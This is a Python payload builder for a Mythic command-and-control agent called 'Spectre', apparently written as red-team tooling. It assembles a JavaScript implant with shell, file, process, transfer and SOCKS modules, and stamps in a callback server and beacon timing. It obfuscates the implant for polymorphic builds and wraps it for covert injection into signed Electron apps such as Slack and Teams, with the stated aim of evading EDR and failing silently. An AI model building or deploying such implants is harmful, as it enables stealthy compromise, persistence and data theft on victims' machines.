"""
Spectre - Mythic Payload Builder

Handles payload generation: reads the JavaScript agent source,
stamps in C2 configuration, applies javascript-obfuscator for
polymorphic builds, and packages for Electron injection.
"""

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import json
import base64
import tempfile

AGENT_CODE_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    "agent_code"
)


class Spectre(PayloadType):
    name = "spectre"
    author = "spectre-dev"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    mythic_encrypts = True
    translation_container = None
    note = (
        "JavaScript-based agent for execution within trusted Electron "
        "applications (Slack, Discord, Teams, VSCode). Evades EDR by "
        "avoiding shellcode injection - runs as native Node.js under "
        "a legitimately-signed process."
    )
    supports_dynamic_loading = True
    agent_type = "agent"
    agent_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    agent_code_path = AGENT_CODE_PATH
    agent_icon_path = None

    build_parameters = [
        BuildParameter(
            name="callback_host",
            parameter_type=BuildParameterType.String,
            description="Callback host (e.g., https://mythic-server.com)",
            default_value="https://127.0.0.1",
            required=True,
        ),
        BuildParameter(
            name="callback_port",
            parameter_type=BuildParameterType.String,
            description="Callback port",
            default_value="443",
            required=True,
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.String,
            description="Callback interval in seconds",
            default_value="10",
            required=True,
        ),
        BuildParameter(
            name="callback_jitter",
            parameter_type=BuildParameterType.String,
            description="Callback jitter percentage (0-100)",
            default_value="23",
            required=True,
        ),
        BuildParameter(
            name="encrypted_exchange_check",
            parameter_type=BuildParameterType.Boolean,
            description="Perform encrypted key exchange on first checkin",
            default_value=True,
            required=False,
        ),
        BuildParameter(
            name="headers",
            parameter_type=BuildParameterType.String,
            description="JSON object of HTTP headers to include",
            default_value='{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}',
            required=False,
        ),
        BuildParameter(
            name="get_uri",
            parameter_type=BuildParameterType.String,
            description="GET request URI for tasking",
            default_value="/api/v1/status",
            required=False,
        ),
        BuildParameter(
            name="post_uri",
            parameter_type=BuildParameterType.String,
            description="POST request URI for responses",
            default_value="/api/v1/data",
            required=False,
        ),
        BuildParameter(
            name="query_param",
            parameter_type=BuildParameterType.String,
            description="Query parameter name for GET requests",
            default_value="token",
            required=False,
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            description="Apply javascript-obfuscator for polymorphic output",
            default_value=True,
            required=False,
        ),
        BuildParameter(
            name="output_format",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["raw_js", "electron_inject", "standalone"],
            description=(
                "raw_js: bare JS agent file. "
                "electron_inject: packaged for Electron app injection. "
                "standalone: self-contained with bundled Node.js require shims."
            ),
            default_value="raw_js",
            required=True,
        ),
    ]

    c2_profiles = ["http"]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            # Collect C2 configuration from build parameters
            c2_config = {
                "callback_host": self.get_parameter("callback_host"),
                "callback_port": int(self.get_parameter("callback_port")),
                "callback_interval": int(self.get_parameter("callback_interval")),
                "callback_jitter": int(self.get_parameter("callback_jitter")),
                "encrypted_exchange_check": self.get_parameter("encrypted_exchange_check"),
                "headers": json.loads(self.get_parameter("headers")),
                "get_uri": self.get_parameter("get_uri"),
                "post_uri": self.get_parameter("post_uri"),
                "query_param": self.get_parameter("query_param"),
                "payloadUUID": self.uuid,
            }

            # Read agent source files and assemble
            agent_js = await self._assemble_agent(c2_config)

            # Optionally obfuscate
            if self.get_parameter("obfuscate"):
                agent_js = await self._obfuscate(agent_js)

            # Package based on output format
            output_format = self.get_parameter("output_format")
            if output_format == "electron_inject":
                agent_js = self._wrap_electron_inject(agent_js)
            elif output_format == "standalone":
                agent_js = self._wrap_standalone(agent_js)

            resp.payload = agent_js.encode("utf-8")
            resp.message = f"Spectre agent built successfully ({output_format})"
            resp.status = BuildStatus.Success

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.message = f"Build failed: {str(e)}"

        return resp

    async def _assemble_agent(self, c2_config: dict) -> str:
        """Read all agent source files and assemble into a single JS payload."""
        src_path = os.path.join(self.agent_code_path, "src")

        # Read source files in dependency order
        source_files = [
            "utils/encoding.js",
            "crypto/aes.js",
            "c2/http.js",
            "commands/shell.js",
            "commands/filesystem.js",
            "commands/process.js",
            "commands/transfer.js",
            "commands/socks.js",
            "agent.js",
        ]

        modules = {}
        for src_file in source_files:
            file_path = os.path.join(src_path, src_file)
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    modules[src_file] = f.read()

        # Stamp in configuration
        config_js = f"const C2_CONFIG = {json.dumps(c2_config, indent=2)};\n"

        # Bundle into single IIFE
        assembled = "(function() {\n'use strict';\n\n"
        assembled += "// === C2 Configuration ===\n"
        assembled += config_js + "\n"

        for src_file, content in modules.items():
            assembled += f"// === {src_file} ===\n"
            assembled += content + "\n\n"

        assembled += "// === Bootstrap ===\n"
        assembled += "const agent = new SpectreAgent(C2_CONFIG);\n"
        assembled += "agent.start();\n"
        assembled += "\n})();\n"

        return assembled

    async def _obfuscate(self, source: str) -> str:
        """Apply javascript-obfuscator for polymorphic output."""
        try:
            import subprocess
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".js", delete=False
            ) as infile:
                infile.write(source)
                infile_path = infile.name

            outfile_path = infile_path + ".obf.js"

            result = subprocess.run(
                [
                    "javascript-obfuscator", infile_path,
                    "--output", outfile_path,
                    "--compact", "true",
                    "--control-flow-flattening", "true",
                    "--control-flow-flattening-threshold", "0.5",
                    "--dead-code-injection", "true",
                    "--dead-code-injection-threshold", "0.2",
                    "--identifier-names-generator", "hexadecimal",
                    "--rename-globals", "true",
                    "--string-array", "true",
                    "--string-array-encoding", "base64",
                    "--string-array-threshold", "0.75",
                    "--transform-object-keys", "true",
                    "--unicode-escape-sequence", "false",
                ],
                capture_output=True, text=True, timeout=60,
            )

            if result.returncode == 0 and os.path.exists(outfile_path):
                with open(outfile_path, "r") as f:
                    obfuscated = f.read()
                os.unlink(infile_path)
                os.unlink(outfile_path)
                return obfuscated
            else:
                # Fall back to unobfuscated if tool not available
                os.unlink(infile_path)
                return source

        except (FileNotFoundError, subprocess.TimeoutExpired):
            # javascript-obfuscator not installed - return raw
            return source

    def _wrap_electron_inject(self, source: str) -> str:
        """Wrap agent for injection into an Electron app's node_modules."""
        wrapper = """
// Spectre - Electron Injection Wrapper
// Inject this into a consistently-loaded module in:
//   <app>/resources/app.asar.unpacked/node_modules/<module>/index.js
//
// The agent executes under the Electron app's signed process context.

(function() {
    // Delay execution to avoid blocking app startup
    setTimeout(function() {
        try {
""".lstrip()
        wrapper += "            " + source.replace("\n", "\n            ")
        wrapper += """
        } catch(e) {
            // Silent failure - do not disrupt host application
        }
    }, 3000);
})();
"""
        return wrapper

    def _wrap_standalone(self, source: str) -> str:
        """Wrap for standalone execution (node spectre.js)."""
        wrapper = "#!/usr/bin/env node\n"
        wrapper += "'use strict';\n\n"
        wrapper += source
        return wrapper
